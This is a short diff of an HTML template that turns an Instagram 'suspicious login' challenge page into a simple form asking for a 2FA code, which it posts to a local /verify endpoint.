@@ -1,11 +1,16 @@
 <!DOCTYPE html>
-<html>
-<head><title>Account Challenge</title></head>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>2FA Verification</title>
+</head>
 <body>
-  <h2>Instagram flagged the login as suspicious</h2>
-  <p>Please go to your Instagram app or website and confirm the login attempt.</p>
-  <form action="/verify" method="post">
-    <button type="submit">I've Verified – Retry Login</button>
-  </form>
+    <h2>Enter the 2FA code sent to your device</h2>
+    <form action="/verify" method="POST">
+        <label for="code">2FA Code:</label>
+        <input type="text" id="code" name="code" required>
+        <br><br>
+        <button type="submit">Verify</button>
+    </form>
 </body>
 </html>
